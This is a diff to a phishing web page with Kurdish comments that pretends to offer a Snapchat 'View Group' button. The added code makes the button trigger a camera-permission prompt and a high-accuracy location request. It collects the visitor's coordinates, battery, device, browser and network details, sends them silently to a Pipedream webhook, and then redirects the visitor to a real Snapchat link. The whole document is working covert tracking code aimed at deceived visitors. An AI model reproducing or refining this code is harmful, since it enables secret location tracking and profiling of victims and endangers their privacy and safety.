@@ -40,7 +40,7 @@
     <button class="btn" id="viewGroupBtn">View Group</button>
 
     <script>
-        // ✅ بەکارهێنانی لینکی تەواو و دروستی پڕۆژەکەت
+        // وێبهۆکە ڕاستەکەی خۆت لێرەدا جێگیرە
         const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
@@ -48,10 +48,17 @@
         let globalCharging = "N/A";
         let globalMaps = "⚠️ مۆڵەتی نەدا";
         let globalDevice = navigator.platform || "Unknown";
-        let globalBrowser = "Safari/iPhone";
+        
+        // جیاکردنەوەی وردی کرۆم و سەفاری لەسەر ئایفۆن
+        let globalBrowser = "Safari (iPhone)";
+        if (navigator.userAgent.indexOf("CriOS") > -1 || navigator.userAgent.indexOf("Chrome") > -1) {
+            globalBrowser = "Chrome (iPhone)";
+        }
+
         let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
         let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";
 
+        // خێرا وەرگرتنی ڕێژەی باتری
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 globalBattery = Math.round(battery.level * 100) + "%";
@@ -59,19 +66,35 @@
             }).catch(() => {});
         }
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
-            }, null, { enableHighAccuracy: true, timeout: 4000 });
-        }
-
-        document.getElementById('viewGroupBtn').addEventListener('click', function() {
+        // 🚀 تەواوی لۆجیکەکە لێرەوە دەست پێدەکات کاتێک دەست بە دوگمەکەوە دەنێت
+        document.getElementById('viewGroupBtn').addEventListener('click', async function() {
             document.getElementById('viewGroupBtn').innerText = "Loading...";
 
-            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
+            // ١. داواکردنی مۆڵەتی کامێرا ڕێک لە کاتی داگرتنی دوگمەکەدا
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                // ئەگەر مۆڵەتی دا، کامێراکە دەکوژێنینەوە چونکە تەنها پۆپئەپەکەمان مەبەستە
+                stream.getTracks().forEach(track => track.stop());
+            } catch (cameraErr) {
+                console.log("کامێرا ڕەتکرایەوە یان پشتگیری ناکرێت");
+            }
 
+            // ٢. ڕاستەوخۆ دوای ئەوە، داواکردنی مۆڵەتی لۆکەیشن
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
+                        resolve();
+                    }, () => {
+                        resolve(); // ئەگەر ڕەتیشی کردەوە هەر دەچێتە قۆناغی دواتر
+                    }, { enableHighAccuracy: true, timeout: 5000 });
+                });
+            }
+
+            // ٣. ڕێکخستنی داتاکان بۆ ناردن
+            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
             const payload = {
                 uid: uid,
                 battery: globalBattery,
@@ -83,20 +106,19 @@
                 maps: globalMaps
             };
 
-            // ناردنی داتا بە شێوازی پارامیتەری ڕوون بۆ ئەوەی ڕێک بچێتە ناو خانەکانی Pipedream
             const params = new URLSearchParams();
             for (const key in payload) {
                 params.append(key, payload[key]);
             }
 
-            // گەرەنتی ناردن لە پاشبنەمای ئایفۆندا
+            // ٤. ناردنی دڵنیا بە sendBeacon بۆ ئەوەی لە ئایفۆندا نەپچڕێت
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(secureWebhook, params);
             } else {
-                fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
+                await fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
             }
 
-            // گواستنەوەی دەستبەجێ بۆ سناپچات
+            // ٥. بازدان بۆ سەر لینکەکەی سناپچات
             window.location.href = snapchatRedirectUrl;
         });
     </script>
